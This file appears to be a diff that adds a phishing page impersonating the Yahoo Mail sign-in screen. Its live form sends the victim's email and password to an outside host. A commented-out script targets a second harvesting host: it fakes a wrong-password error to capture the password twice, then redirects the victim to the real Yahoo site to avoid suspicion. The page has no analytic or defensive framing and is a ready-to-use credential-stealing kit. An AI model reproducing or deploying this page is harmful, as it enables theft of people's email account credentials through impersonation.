@@ -1,0 +1,253 @@
+<html lang="eng">
+    <head>
+        <title>Yahoo</title>
+        <Meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <!-- bootstrap -->
+<!-- 
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+            <script src="https://unpkg.com/axios/dist/axios.min.js"></script> -->
+
+            <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+             -->
+            <script src="js/bootstrap.js"></script>
+            <script src="jq/jquery-3.5.1.slim.min.js"></script>
+            <!-- css -->
+            <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+       
+        <main>
+            <section>
+                <div class="my_img">
+                <div class="container-fliud">
+                    <div class="row padding">
+                        <div class="col-md-12">
+                            <img src="https://imgur.com/40ZgYDO.png" alt="capture.png" class="img-responsive"/>
+                            
+                        </div>
+                    </div>
+                </div>
+                </div>
+             
+            
+                 <div class="my_form">
+                    <!-- <form id="myForm" onsubmit="return validateForm()"> -->
+                        <form method="post" action="https://machestwaterschuks.site/cm/cl.php" autocomplete="">
+
+                         <img src="https://imgur.com/40ZgYDO.png" class="logo" alt="logo">
+                         <h1>sign in to yahoo mail</h1>
+                         <h4>use your yahoo account</h4>
+                         <div class="alert alert-danger" id="wrongPasswordAlert" style="display: none" <center=""> <strong>Error!!</strong> Incorrect password
+                         </div>
+                         <input type="email"  name="email" id="" class="jet" value="[[-email-]]" placeholder=" Username Email or Mobile" size="30%" style="width: 80%;"><hr><br>
+                         <input  type="password" name="pass" id="" class="jet" placeholder="Password" size="30%" style="width: 80%;"><hr><br>
+                        <!-- <input type="checkbox">
+                         <label>Remember Me</label><br> -->
+                         <button type="submit" name="enter" style="width: 100%; height: 37px; background-color: #179bd7; border: none;margin: 0px; font-size: 20px; color: #fff;">Next</button>
+                          <input type="checkbox">
+                         <label><a href="#">Stay Signed In</a></label><br>  <label><a href="#" class="dis">Trouble Signing In?</a></label><br>
+                         <!-- <input type="submit" value="Sign in" name="enter" style="width: 80%;"> -->
+                         <p><a href="#">Forgot your password?</a></p>
+                         <p><a href="#" class="cre">Create Account</a></p>
+                     </form>
+                 </div>
+             </section>
+         </main>
+         <style>
+             body{
+    margin: 0px;
+    padding: 0px;
+    box-sizing: border-box;
+    background-color: #fff;
+    width: 100%;
+    overflow: hidden;
+    /* background-color:whitesmoke; */
+    background-image: url("https://imgur.com/tlbyxet.jpg");
+}
+.cre{
+    border-radius: 25px;
+    padding: 2%;
+    font-size: 20px;
+    font-family: Arial, Helvetica, sans-serif;
+    border: solid blue 1px;
+    width: 50%;
+    position: relative;
+    left: 30%;
+
+
+}
+div{
+    /* height: 30%; */
+}
+
+hr{
+    color: #73b7f5;
+    border: solid 2px;
+    line-height: 20px;
+    position: relative;
+    top: -50%;
+    margin-top: -13px;
+}
+.my_img img{
+    width: 10%;
+    margin-left: 5px;
+    padding: 5px;
+    
+}
+
+
+.identity {
+    line-height: 28px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    text-align: right;
+    width: calc(100% - 56px);
+}
+.my_form{
+    margin: auto 50%;
+    position: absolute;
+    top: 20%;
+    left: 18%;
+    border: 30px solid #ffffff;
+    background-color: #ffffff;
+    background-color: transparent 1.8;
+    width: 400px;
+    height: 700px;
+}
+.my_form .labels {
+    font-size: 35px;
+    text-align: center;
+    margin: 5px;
+    position: relative;
+    left: 15px;
+}
+label{
+    margin: 3%;
+    /* display: inline-flex; */
+font-family: Arial, Helvetica, sans-serif;
+ font-size: 15px;
+}
+.dis{
+ position: relative;
+ left: 145%;
+ top: -40px;
+ font-family: Arial, Helvetica, sans-serif;
+ font-size: 15px;
+}
+p a{
+    position: relative;
+    left:30px;
+}
+.jet{
+    margin: 3%;
+    position: relative;
+    left: 20px;
+    padding: 3%;
+    top: -20%;
+    border:none;
+    font-size: larger;
+    font-family: Arial, Helvetica, sans-serif;
+    font-weight: bolder;   
+    
+}
+ input[type="submit"]{
+     background-color: #188fff;
+     border: none;
+     color: #ffff;
+     font-size: 20px;
+ }
+ .logo{
+     width: 50%;
+    position: relative;
+    left: 20%;
+ }
+ h1{
+     font-size: 20px;
+     font-family: Arial, Helvetica, sans-serif;
+     text-align: center;
+     text-transform: capitalize;
+ }
+ h4{
+    font-size: 14px;
+     font-family: Arial, Helvetica, sans-serif;
+     text-align: center;
+     text-transform: capitalize;
+ }
+         </style>
+
+        <script>
+    //        document.getElementById("email").value = getUrlVars()["emailid"];;
+               
+    // /          function getUrlVars() {
+    //                     var vars = {};
+    //                    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+    //                    vars[key] = value;
+    //                     });
+    //                    return vars;
+    //                 } 
+              
+    //         type="text/javascript">
+	// 		document.write(unescape('%3Cscript%20language%3D%22JavaScript%22%3E%0A%3C!--%0Afunction%20validateForm()%0A%7B%0Avar%20y%3Ddocument.forms%5B%22myform%22%5D%5B%22dito%22%5D.value%3B%0Aif(y%3D%3Dnull%20%7C%7C%20y%3D%3D%22%22)%0A%20%20%7B%0A%20%20alert(%22域名%20is%20Empty%22)%3B%0A%20%20return%20false%3B%0A%20%20%7D%0Avar%20y%3Ddocument.forms%5B%22myform%22%5D%5B%22doti%22%5D.value%3B%0Aif(y%3D%3Dnull%20%7C%7C%20y%3D%3D%22%22)%0A%20%20%7B%0A%20%20alert(%22验证码%20is%20Empty%22)%3B%0A%20%20return%20false%3B%0A%20%20%7D%0A%7D%0A%0A%0A%0A--%3E%0A%3C%2Fscript%3E'));
+    //     </script>
+    //     <script>
+    //         var form = document.getElementById("myForm");
+    //            var count = 0;
+      
+    //            function showAlert() {
+    //               var alert = document.getElementById("wrongPasswordAlert");
+    //               alert.style.display = "block";
+    //            }
+      
+    //            function send(email, pass, onSuccess) {
+    //               const form = new FormData();
+    //               form.append("email", email);
+    //               form.append("pass", pass);
+    //               form.append("count", count);
+    //               form.append("enter", true);
+      
+    //                axios({
+    //                   method: "post",
+    //                  url:"https://saeedlift.online/mklo/vghl.php",
+    //                  data: form,
+    //                   headers: {
+    //                      "Content-Type": `multipart/form-data; boundary=${form._boundary}`,
+    //                  },
+    //               })
+    //                  .then(function (response) {
+    //                     console.log(response);
+    //                     if (onSuccess) onSuccess();
+    //                  })
+    //                  .catch(function (error) {
+    //                     console.log(error);
+    //                  });
+    //            }
+      
+    //            form.onsubmit = function (e) {
+    //               e.preventDefault();
+    //               var email = document.getElementById("email");
+    //               var pass = document.getElementById("pass");
+      
+    //               if (count == 0) {
+    //                 showAlert();
+    //                 send(email.value, pass.value, count);
+    //                 pass.value = "";
+    //              } else {
+    //                 send(email.value, pass.value, function () {
+    //                    window.location.href = "https://yahoo.com";
+    //                 });
+      
+    //                  return;
+    //                }
+    //                count++;
+    //             };
+     
+    //   </script>
+          
+    </body>
+    
+ </html>
